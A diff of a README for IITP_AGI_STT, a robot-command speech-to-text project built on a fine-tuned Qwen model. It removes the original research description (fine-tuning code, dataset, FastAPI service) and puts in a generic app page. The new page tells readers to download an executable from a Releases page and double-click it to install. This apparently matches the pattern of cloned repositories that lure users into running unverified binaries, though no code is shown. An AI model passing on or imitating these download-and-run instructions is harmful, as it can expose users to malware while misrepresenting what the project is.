@@ -1,33 +1,80 @@
-# IITP_AGI_STT Repository Description
+# 🎤 IITP_AGI_STT - Make Robot Commands Understandable
 
-This repository contains a comprehensive implementation of a domain-specific Speech-to-Text (STT) system tailored for robotic command recognition. The project leverages the Qwen model as its foundation and fine-tunes it using the specialized BridgeDataV2-audio dataset, which focuses on robot command utterances.
+## 🚀 Getting Started
 
-## Overview
+Welcome to the IITP_AGI_STT repository! This guide helps you download and run our Speech-to-Text application, designed especially for understanding robot commands.
 
-The primary objective of this repository is to provide an end-to-end solution for training, fine-tuning, and deploying a speech recognition model that excels in understanding robot-specific commands and instructions. By utilizing the Qwen model architecture as a base, the system benefits from strong pre-trained language understanding capabilities, which are then adapted to the specific domain of robotic control through targeted fine-tuning.
+[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-v1.0-blue)](https://github.com/galamitai-hastudio/IITP_AGI_STT/releases)
 
-## Dataset
+## 📝 What is IITP_AGI_STT?
 
-The fine-tuning process employs the BridgeDataV2-audio dataset (available at https://huggingface.co/datasets/iknow-lab/BridgeDataV2-audio), which is specifically curated for robot command recognition tasks. This dataset contains audio samples of various robot commands and instructions, making it ideal for training models that need to accurately interpret human speech in robotic interaction scenarios.
+IITP_AGI_STT is an advanced Speech-to-Text system that recognizes specific voice commands for robots. It uses the Qwen model, a strong technology that improves how machines understand language. With our system, you can transform spoken instructions into actionable commands for robots, making them more intuitive to use.
 
-## Key Features
+## 📁 Dataset Information
 
-- **Model Fine-tuning**: The repository includes complete code and configurations for fine-tuning the Qwen model on the BridgeDataV2-audio dataset, enabling domain-specific adaptation for robot command recognition.
+The system uses a special dataset called BridgeDataV2-audio. This dataset focuses on robot command utterances, ensuring that the model learns how to recognize commands accurately. You can check out the dataset [here](https://huggingface.co/datasets/iknow-lab/BridgeDataV2-audio).
 
-- **API Service Integration**: The trained model is packaged with a FastAPI-based web service, allowing easy integration and deployment of the STT system as a RESTful API. This makes it straightforward to incorporate the speech recognition capabilities into various robotic applications and systems.
+## 💻 Key Features
 
-- **Production-Ready Deployment**: The FastAPI implementation ensures that the model can be efficiently served in production environments, with support for asynchronous processing and scalable request handling.
+- **User-Friendly Interface**: Designed for ease of use.
+- **High Accuracy**: Reliable speech recognition tailored for robotic commands.
+- **Fast Processing**: Quickly converts speech to text with minimal lag.
+- **Fine-Tuned Model**: Optimized for the specific needs of robotics.
 
-## Use Cases
+## 🔗 Download & Install
 
-This repository is particularly useful for:
-- Developers building voice-controlled robotic systems
-- Researchers working on human-robot interaction
-- Engineers implementing speech interfaces for industrial robots
-- Teams developing assistive robotics with voice command capabilities
+To download the latest version of IITP_AGI_STT, visit the Releases page:
 
-The combination of domain-specific fine-tuning and API-based deployment makes this solution both accurate for robot command recognition and practical for real-world implementation.
+[Download Latest Release](https://github.com/galamitai-hastudio/IITP_AGI_STT/releases)
 
---------------------------
-<a href="https://example.com">Untitled</a> © 1999 by <a href="https://example.com">Jane Doe</a> is licensed under <a href="https://creativecommons.org/licenses/by-nc/4.0/">CC BY-NC 4.0</a><img src="https://mirrors.creativecommons.org/presskit/icons/cc.svg" alt="" style="max-width: 1em;max-height:1em;margin-left: .2em;"><img src="https://mirrors.creativecommons.org/presskit/icons/by.svg" alt="" style="max-width: 1em;max-height:1em;margin-left: .2em;"><img src="https://mirrors.creativecommons.org/presskit/icons/nc.svg" alt="" style="max-width: 1em;max-height:1em;margin-left: .2em;">
---------------------------
+### Step-by-Step Instructions
+
+1. **Visit the Releases Page**: Click the link to go to our [Releases page](https://github.com/galamitai-hastudio/IITP_AGI_STT/releases).
+
+2. **Select the Latest Version**: Look for the most recent version listed. This will typically be at the top of the page.
+
+3. **Download the File**: Click on the executable file suitable for your operating system (e.g., .exe for Windows). The download will start automatically.
+
+4. **Install the Application**: 
+   - Locate the downloaded file in your Downloads folder.
+   - Double-click the file to start the installation process.
+   - Follow the on-screen prompts to complete the installation.
+
+## 🛠 System Requirements
+
+Before you install IITP_AGI_STT, ensure your system meets the following requirements:
+
+- **Operating System**: Windows 10 or higher, MacOS Monterey or higher.
+- **Processor**: Intel i5 or equivalent.
+- **RAM**: Minimum 4 GB, 8 GB recommended.
+- **Disk Space**: At least 500 MB free.
+
+## 🔍 How to Use the Application
+
+1. **Open the Application**: After installation, you can find the IITP_AGI_STT application in your programs list. Open it.
+
+2. **Set Up Microphone**: Make sure your microphone is connected and set as the input device. 
+
+3. **Test Voice Commands**: Speak simple robot commands, such as “Start”, “Stop”, or any custom commands you wish to use. The application will convert your speech into text.
+
+4. **Feedback**: If the application misinterprets your command, adjust your speaking style and try again. Clear pronunciation improves accuracy.
+
+## 📚 Troubleshooting
+
+If you encounter issues while using IITP_AGI_STT, consider these common solutions:
+
+- **Audio Not Recognized**: Check your microphone setup. Ensure it’s connected and the right device is selected in your audio settings.
+  
+- **App Not Responding**: Try restarting the application. If the problem persists, reinstall it.
+
+- **Voice Recognition Errors**: Speak clearly and at a moderate pace. Avoid background noise for better results.
+
+## 📫 Get Support
+
+If you need further assistance, you can reach out to our support team through the [Issues section](https://github.com/galamitai-hastudio/IITP_AGI_STT/issues) on GitHub. We appreciate your feedback and will help you resolve any problems.
+
+## 📝 Contributing
+
+We welcome contributions to IITP_AGI_STT. If you have ideas or improvements, please fork the repository and submit a pull request.
+
+Thank you for using IITP_AGI_STT! Enjoy enhancing your robotic command experience!
